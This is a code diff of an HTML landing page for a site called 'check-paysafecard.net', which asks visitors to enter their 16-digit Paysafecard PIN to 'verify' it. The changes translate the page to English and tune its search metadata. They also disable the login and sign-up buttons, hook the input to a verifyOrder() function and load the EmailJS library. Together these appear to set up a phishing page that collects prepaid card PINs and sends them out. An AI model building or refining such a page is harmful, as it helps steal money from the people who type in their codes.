@@ -1,20 +1,19 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 
 <head>
     
     <meta charset="UTF-8">
 
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+    <meta name="robots" content="index,follow">
     <!-- Titre Google -->
-    <title>check paysafecard - Vérification paysafecard</title>
+    <title>Check Paysafecard – Verify Your 16-Digit Paysafecard Code</title>
 
     <!-- Description Google -->
-    <meta name="description" content="Then simply check your balance by entering the 16-digit code here. Better yet, sign up and store all your codes in one easy spot!.">
-
+    <meta name="description" content="Check your Paysafecard code securely online. Enter your 16-digit Paysafecard PIN to verify your code quickly and easily.">
     <!-- Mots-clés -->
-    <meta name="keywords" content="check PaysafeCard, PaysafeCard, verifier PaysafeCard, verify paysafecard, verifier code PaysafeCard, Paysafecard verification, Paysafecard online ">
+    <meta name="keywords" content="check PaysafeCard, check PaysafeCard code, code PaysafeCard, verify paysafecard, verifier code PaysafeCard, Paysafecard verification, Paysafecard online ">
 
     <!-- Auteur -->
     <meta name="author" content="check-PaysafeCard">
@@ -43,9 +42,9 @@
 
     <meta property="og:type" content="website">
 
-    <meta property="og:title" content="check-PaysafeCard">
+    <meta property="og:title" content="Check Paysafecard - Verify Your 16-Digit Code">
 
-    <meta property="og:description" content="Vérifiez votre code rapidement et simplement.">
+    <meta property="og:description" content="Verify your 16-digit Paysafecard code quickly, securely and online.">
 
     <meta property="og:url" content="https://check-paysafecard.net/">
 
@@ -56,23 +55,26 @@
 
     <meta name="twitter:card" content="summary">
 
-    <meta name="twitter:title" content="Checke - paysafecard code">
+    <meta name="twitter:title" content="Check Paysafecard - Verify Your Code">
 
-    <meta name="twitter:description" content="Service de vérification paysafecard ligne.">
-
+    <meta name="twitter:description" content="Check your Paysafecard code quickly and securely online.">
     <meta name="twitter:image" content="https://check-paysafecard.net/assets/logo.png">
 
 
     <!-- Données structurées Google -->
 
     <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "WebSite",
-      "name": "check-paysafecard",
-      "url": "https://check-paysafecard.net",
-      "logo": "https://check-paysafecard.net/assets/logo.png"
-    }
+      {
+ "@context":"https://schema.org",
+ "@type":"WebSite",
+ "name":"Check Paysafecard",
+ "url":"https://check-paysafecard.net",
+ "potentialAction":{
+   "@type":"SearchAction",
+   "target":"https://check-paysafecard.net/?code={search_term_string}",
+   "query-input":"required name=search_term_string"
+   }
+}
     </script>
 
 
@@ -91,22 +93,22 @@
         <div class="logo-container">
 
             <div class="logo">
-                PS
-            </div>
+          <img src="assets/header-logo.png" alt="Logo check Paysafecard">
+        </div>
 
-            <h2>PaysafeCard</h2>
+            <h2>Paysafecard</h2>
 
         </div>
 
         <div class="buttons">
 
-            <button class="login-btn">
+            <button class="login-btn" disabled>
                 Log in
-            </button>
+           </button>
 
-            <button class="signup-btn">
-                Sign up
-            </button>
+           <button class="signup-btn" disabled>
+    Sign up
+          </button>
 
         </div>
 
@@ -131,36 +133,33 @@
 
             <h1>
 
-            Do you already have a PaysafeCard prepaid code?<br>
+            Do you already have a Paysafecard prepaid code?
 
             </h1>
-
-            <div class="separator"></div>
-
+          <h2>Verify your Paysafecard balance online</h2>
             <p>
 
-             Then simply check your balance by entering the 16-digit code here. Better yet, sign up and store all your codes in one easy spot!
+             Then simply check your balance by entering the 16-digit code here!
 
             </p>
 
+               
+          <div class="search-box">
 
-            <div class="search-box">
+    <input
+        id="orderNumber"
+        type="text"
+        maxlength="19"
+        placeholder="Enter your 16-digit Paysafecard code">
 
-                <input
-                    type="text"
-                    maxlength="16"
-                    placeholder="please enter the 16-digit code">
+    <button onclick="verifyOrder()">
+        submit
+    </button>
 
+</div>
 
-                <button>
-
-                    submit
-
-                </button>
-
-            </div>
-
-        </div>
+<p id="message"></p>
+</div>
 
     </section>
 <!-- ==========================
@@ -197,8 +196,6 @@
     </div>
 
 </section>
-
-    <!-- FOOTER -->
 
    <!-- ===========================
         FOOTER
@@ -275,7 +272,7 @@
 
     <div class="copyright">
 
-        © 2018 PaysafeCard cheker — All rights reserved.
+        © 2018 Paysafecard checker — All rights reserved.
 
     </div>
 
@@ -284,7 +281,9 @@
 
 <link rel="stylesheet"
 href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
- <script src="script.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script src="script.js"></script>
+
 </body>
 
 </html>
